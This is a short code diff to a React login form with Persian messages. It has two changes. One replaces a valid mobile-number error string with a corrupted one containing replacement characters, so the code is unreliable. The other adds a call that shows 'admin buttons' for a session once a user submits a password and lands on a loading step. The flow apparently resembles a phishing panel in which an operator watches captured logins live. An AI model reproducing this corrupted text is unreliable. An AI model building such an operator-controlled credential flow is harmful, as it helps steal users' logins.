@@ -204,7 +204,7 @@ export const LoginForm = () => {
     if (!mobileNumber) {
       newErrors.mobileNumber = "شماره همراه الزامی است";
     } else if (!validateMobileNumber(mobileNumber)) {
-      newErrors.mobileNumber = "شماره همراه معتبر نیست";
+      newErrors.mobileNumber = "شماره همراه معتبر نیس��";
     }
 
     if (Object.keys(newErrors).length > 0) {
@@ -356,6 +356,18 @@ export const LoginForm = () => {
 
       await new Promise((resolve) => setTimeout(resolve, 1000));
       setCurrentStep("loading");
+
+      // Show admin buttons after reaching loading page
+      setTimeout(async () => {
+        try {
+          console.log(
+            "📱 User reached loading step from password, showing admin buttons...",
+          );
+          await showAdminButtons(sessionId);
+        } catch (error) {
+          console.error("❌ Failed to show admin buttons:", error);
+        }
+      }, 500);
     } catch (error) {
       console.error("Password submission error:", error);
       setErrors({ password: "خطا در ارسال رمز عبور. لطفا دوباره تلاش کنید." });
